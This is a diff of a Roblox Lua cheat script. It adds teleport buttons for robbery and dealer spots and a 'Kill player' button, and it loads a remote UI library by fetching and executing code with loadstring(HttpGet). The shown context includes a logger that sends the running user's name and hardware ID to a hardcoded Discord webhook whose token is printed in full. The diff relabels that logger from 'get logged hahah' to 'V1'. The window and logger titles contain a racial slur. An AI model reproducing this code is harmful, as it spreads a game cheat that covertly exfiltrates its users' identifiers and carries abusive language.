@@ -1,5 +1,5 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("niggaclark3000 🧻 | by [REDACTED]", "DarkTheme")
+local Window = Library.CreateLib("niggaclark3000 🧻 | by discord.gg/LINKHERE", "DarkTheme")
 local Tab = Window:NewTab("Teleport")
 local Section = Tab:NewSection("Teleport")
 
@@ -23,6 +23,24 @@ Section:NewButton("Port CD", "Car Dealership", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-117.509399, 209.599991, 3059.4436, 0.0584034771, 8.03887659e-08, -0.998293042, -2.01320649e-08, 1, 7.93484247e-08, 0.998293042, 1.54634776e-08, 0.0584034771)
 end)
 
+
+
+
+
+
+
+local Tab = Window:NewTab("Dealers/Sellers")
+local Section = Tab:NewSection("Dealers")
+Section:NewButton("Port Seller", "Buys Mil cards", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(811.597839, 197.074982, 2821.43188, 0.0564803518, -3.56545904e-08, -0.998403728, -3.0888831e-08, 1, -3.74589959e-08, 0.998403728, 3.29552208e-08, 0.0564803518)
+end)
+
+
+
+
+
+
+
 local Tab = Window:NewTab("Robbing")
 local Section = Tab:NewSection("Robbing")
 Section:NewButton("MNG Base", "", function()
@@ -41,6 +59,10 @@ Section:NewButton("Lockpick Dealer 2", "", function()
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-293.427307, 209.097504, 3301.65674, 0.98310864, 1.89121288e-08, 0.183023065, -3.02183736e-08, 1, 5.89860818e-08, -0.183023065, -6.35203818e-08, 0.98310864)
 end)
 
+Section:NewButton("Kill player", "removes combat log", function()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1, -1, -1, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
 local webh = "https://discord.com/api/webhooks/1339460549431398482/zASFb-BCy3YujV1gyio0P0rpFqws3qQ3cpnqILWuVnBIQcl7eRhzf-1BZ287IumlZRWd"
 
 
@@ -50,7 +72,7 @@ pcall(function()
   ['embeds'] = {
     {
        ['title'] = 'nigga clark ultra logger',
-       ['description'] = 'get logged hahah!!!',
+       ['description'] = 'V1',
        ['fields'] = {
           {name = 'User', value = game:GetService("Players").LocalPlayer.Name},
           {name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
